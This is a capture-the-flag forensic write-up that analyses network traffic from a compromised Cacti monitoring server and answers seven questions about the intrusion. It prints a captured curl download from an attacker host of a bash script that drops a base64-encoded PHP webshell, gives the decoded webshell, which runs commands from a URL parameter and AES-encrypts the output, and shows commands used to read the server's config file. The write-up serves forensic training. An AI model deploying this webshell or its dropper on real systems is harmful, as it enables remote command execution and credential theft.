# pcap analysis - University CTF 2025: Tinsel Trouble

**Challenge:** A Trail of Snow and Deception  
**Category:** Forensic  
**Difficulty:** Easy  
**Date:** December 23, 2025

## Overview

This CTF challenge required analyzing network traffic to reveal how an attacker exfiltrated data from a compromised Cacti monitoring system. The investigation involved decrypting command outputs and uncovering database credentials.

---

## Question 1: Cacti Version

**Q: What is the Cacti version in use? (e.g. 7.1.0)**

### Solution

I filtered the network traffic to HTTP in Wireshark and searched for the keyword "version".

**Finding:**
```html
<div class='versionInfo'>Version 1.2.28 | (c) 2004-2025 - The Cacti Group</div>
```

**Answer:** `1.2.28`

---

## Question 2: Login Credentials

**Q: What is the set of credentials used to log in to the instance? (e.g., username:password)**

### Solution

Applied a Wireshark display filter to find authentication attempts:

```
frame contains "username"
```

**Traffic Found:**
- Packet #733 at `2025-12-02 16:14:27`
- POST request to `/cacti/index.php`

**Request Body:**
```
action=login&login_username=marnie.thistlewhip&login_password=Z4ZP_8QzKA
```

**Answer:** `marnie.thistlewhip:Z4ZP_8QzKA`

---

## Question 3: Malicious PHP Files

**Q: Three malicious PHP files are involved in the attack. In order of appearance in the network stream, what are they? (e.g., file1.php,file2.php,file3.php)**

### Solution

Extracted HTTP objects from the pcap file:
- **File** → **Export Objects** → **HTTP...**

Among all HTTP files, these three stood out as suspicious:

1. `JWUA5a1yj.php`
2. `ornF85gfQ.php`
3. `f54Avbg4.php`

**Answer:** `JWUA5a1yj.php,ornF85gfQ.php,f54Avbg4.php`

---

## Question 4: Downloaded File

**Q: What file gets downloaded using curl during exploitation process? (e.g. filename)**

### Solution

Filtered for curl activity:

```
frame contains "curl"
```

**HTTP Request Found:**
```http
GET /bash HTTP/1.1
Host: 10.10.0.1
User-Agent: curl/8.5.0
Accept: */*
```

**Response Payload:**
```bash
#!/bin/bash
echo PD9waHAgJEE0Z1ZhR3pIID0gImtGOTJzTDBwUXc4ZVR6MTdhQjR4TmM5VlVtM3lIZDZHIjskQTRnVmFSbVYgPSAicFo3cVIxdEx3OERmM1hiSyI7JEE0Z1ZhWHpZID0gYmFzZTY0X2RlY29kZSgkX0dFVFsicSJdKTskYTU0dmFnID0gc2hlbGxfZXhlYygkQTRnVmFYelkpOyRBNGdWYVFkRiA9IG9wZW5zc2xfZW5jcnlwdCgkYTU0dmFnLCJBRVMtMjU2LUNCQyIsJEE0Z1ZhR3pILE9QRU5TU0xfUkFXX0RBVEEsJEE0Z1ZhUm1WKTtlY2hvIGJhc2U2NF9lbmNvZGUoJEE0Z1ZhUWRGKTsgPz4=|base64 --decode > f54Avbg4.php
```

**Answer:** `bash`

---

## Question 5: Variable Name

**Q: What is the name of the variable in one of the three malicious PHP files that stores the result of the executed system command? (e.g., $q5ghsA)**

### Solution

Decoded the base64 payload from the previous curl traffic:

```php
<?php 
$A4gVaGzH = "kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G";  // AES key
$A4gVaRmV = "pZ7qR1tLw8Df3XbK";                   // AES IV
$A4gVaXzY = base64_decode($_GET["q"]);            // Command
$a54vag = shell_exec($A4gVaXzY);                  // ← ANSWER HERE
$A4gVaQdF = openssl_encrypt($a54vag,"AES-256-CBC",$A4gVaGzH,OPENSSL_RAW_DATA,$A4gVaRmV);
echo base64_encode($A4gVaQdF); 
?>
```

The variable `$a54vag` stores the output from `shell_exec()`.

**Answer:** `$a54vag`

---

## Question 6: System Hostname

**Q: What is the system machine hostname? (e.g. server01)**

### Solution

Found a file named `f54Avbg4.php?q=aG9zdG5hbWU=` which indicated a hostname command was executed.

**Base64 Decode:**
```
aG9zdG5hbWU= → hostname
```

**Encrypted Response:**
```
HYjF7a38Od/H2Qc+uaBKuA==
```

**Decryption Script (PowerShell):**
```powershell
$encrypted = "HYjF7a38Od/H2Qc+uaBKuA=="
$key = "kF92sL0pQw8eTz17aB4xNc9VUm3yHd6G"
$iv = "pZ7qR1tLw8Df3XbK"

$encryptedBytes = [Convert]::FromBase64String($encrypted)
$keyBytes = [Text.Encoding]::UTF8.GetBytes($key)
$ivBytes = [Text.Encoding]::UTF8.GetBytes($iv)

$aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
$aes.Key = $keyBytes
$aes.IV = $ivBytes
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::None

$decryptor = $aes.CreateDecryptor()
$decrypted = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
[Text.Encoding]::UTF8.GetString($decrypted).Trim([char]0)
```

**Answer:** `tinselmon01`

---

## Question 7: Database Password

**Q: What is the database password used by Cacti? (e.g. Password123)**

### Solution

Found another suspicious file: `f54Avbg4.php?q=Y2F0IGluY2x1ZGUvY29uZmlnLnBocA==`

**Base64 Decode:**
```
Y2F0IGluY2x1ZGUvY29uZmlnLnBocA== → cat include/config.php
```

**Decryption Process:**

Used the same AES-256-CBC decryption method with the webshell's key and IV to decrypt the response containing the entire `include/config.php` file.

**Key Section from Decrypted Output:**
```php
<?php
/*
 * Make sure these values reflect your actual database/host/user/password
 */
$database_type     = 'mysql';
$database_port     = '3306';
$database_default  = 'cacti';
$database_hostname = 'db';
$database_username = 'cacti';
$database_password = 'zqvyh2fLgyhZp9KV';
?>
```

**Answer:** `zqvyh2fLgyhZp9KV`



**Tags:** #Forensic #NetworkAnalysis #Wireshark #AES #Decryption

